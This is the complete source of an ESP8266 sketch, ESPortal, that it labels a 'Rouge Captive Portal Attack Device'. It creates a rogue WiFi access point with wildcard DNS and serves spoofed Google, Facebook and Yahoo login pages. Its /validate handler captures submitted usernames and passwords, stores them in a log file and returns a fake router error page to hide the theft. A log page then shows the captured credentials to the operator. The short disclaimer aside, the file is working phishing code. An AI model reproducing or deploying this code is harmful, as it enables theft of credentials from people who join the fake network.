/*
 *ESPortal by Corey Harding 
 * www.legacysecuritygroup.com
 * Configure access point name and up to 3 custom domains and login urls in config.h
 * Configure the html for login page of said domains in site1.h, site2.h, and site3.h
 * Configure the html for any other domain(catch-all) in site_other.h
 * This is only a proof-of-concept.  I am not responsible for your actions.
 * Obey all local, state, federal, and international laws!
*/
#include <ESP8266WiFi.h>
#include <WiFiClient.h>
#include <ESP8266WebServer.h>
#include <DNSServer.h>
#include <ESP8266mDNS.h>
#include <FS.h>
#include "config.h"
#include "site1.h"
#include "site2.h"
#include "site3.h"
#include "sitecaptiveportal.h"
#include "portal_login.h"

#define LOGFILE "/log.txt"

// Basic configuration using common network setups (usual DNS port, IP and web server port)
const byte DNS_PORT = 53;
IPAddress apIP(192, 168, 1, 1);
DNSServer dnsServer;
ESP8266WebServer webServer(80);
ESP8266WebServer httpServer(1337);

// Buffer strings
String webString="";
String serialString="";

// Blink the builtin LED n times
void blink(int n)
{
  for(int i = 0; i < n; i++)
  {
    digitalWrite(LED_BUILTIN, LOW);    
    delay(250);                    
    digitalWrite(LED_BUILTIN, HIGH);  
    delay(250);
  }
}

void setup() {
  //Start Serial communication
  Serial.begin(9600);
  Serial.println();
  Serial.println("V2.0.0 - Rouge Captive Portal Attack Device");
  Serial.println();

  // LED setup
  pinMode(LED_BUILTIN, OUTPUT);
  digitalWrite(LED_BUILTIN, HIGH);  

  // Initialize file system (SPIFFS) and read the log file, if not present create a new one
  Serial.print("Initializing File System (First time can take around 90 seconds)...");
  SPIFFS.begin();
  Serial.println(" Success!");
  Serial.print("Checking for log.txt file...");
  // this opens the file "log.txt" in read-mode
  File f = SPIFFS.open(LOGFILE, "r");
  
  if (!f) {
    Serial.print(" File doesn't exist yet. \nFormatting and creating it...");
    SPIFFS.format();
    // open the file in write mode
    File f = SPIFFS.open(LOGFILE, "w");
    if (!f) {
      Serial.println("File creation failed!");
    }
    f.println("Captured Login Credentials:");
  }
  f.close();
  Serial.println(" Success!");

  // Create Access Point
  Serial.print("Creating Access Point...");
  WiFi.mode(WIFI_AP);
  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
  WiFi.softAP(setSSID);
  Serial.println(" Success!");

  // Start DNS Server
  Serial.print("Starting DNS Server...");
  dnsServer.start(DNS_PORT, "*", apIP);
  Serial.println(" Success!");

  // Check domain name and refresh page
  webServer.onNotFound([]() {
    webServer.send(200, "text/html", responseHTML);
  });

  // Generic catch all login page for domains not listed in configuration
  webServer.on(SITEOTHER_redirect,[]() {
    webServer.send_P(200, "text/html", GOOGLE_HTML);
  });

  // SITE1 login page
  webServer.on(SITE1_redirect,[]() {
    webServer.send_P(200, "text/html", GOOGLE_HTML);
  });

  // SITE2 login page
  webServer.on(SITE2_redirect,[]() {
    webServer.send_P(200, "text/html", FACEBOOK_HTML);
  });

  // SITE3 login page
  webServer.on(SITE3_redirect,[]() {
    webServer.send_P(200, "text/html", YAHOO_HTML);
  });

  // Captive portal login page
  webServer.on(PORTALLOGIN_redirect,[]() {
    webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
  });

  // Validate-Save USER/PASS combinations
  webServer.on("/validate", []() {
    // store harvested credentials
    String url = webServer.arg("url");
    String user = webServer.arg("user");
    String pass = webServer.arg("pass");

    // Sending data to Serial (DEBUG)
    serialString = user+":"+pass;
    Serial.println(serialString);

    // Append data to log file
    File f = SPIFFS.open(LOGFILE, "a");
    f.print(url);
    f.print(":");
    f.print(user);
    f.print(":");
    f.println(pass);
    f.close();
    
    // Send an error response to the user after credential harvesting
    webString = "<h1>#E701 - Router Configuration Error</h1>";
    webServer.send(500, "text/html", webString);

    // Reset buffer strings
    serialString="";
    webString="";

    blink(5);
  });

  // Logging Page
  webServer.on("/esportal/log", [](){
    webString="<html><body><a href=\"/esportal\"><- BACK TO INDEX</a><br><pre>";
    File f = SPIFFS.open(LOGFILE, "r");
    serialString = f.readString();
    webString += serialString;
    f.close();
    webString += "</pre></body></html>";
    webServer.send(200, "text/html", webString);
    Serial.println(serialString);
    serialString="";
    webString="";
  });
  
  // Start Webserver
  Serial.print("Starting Web Server...");
  webServer.begin();
  httpServer.begin();

  MDNS.addService("http", "tcp", 1337);
  Serial.println(" Success!");
  blink(10);
  Serial.println("Device Ready!");
}

void loop() {
  // Check for DNS Request/Dish out Web Pages
  dnsServer.processNextRequest();
  webServer.handleClient();
  httpServer.handleClient();
}
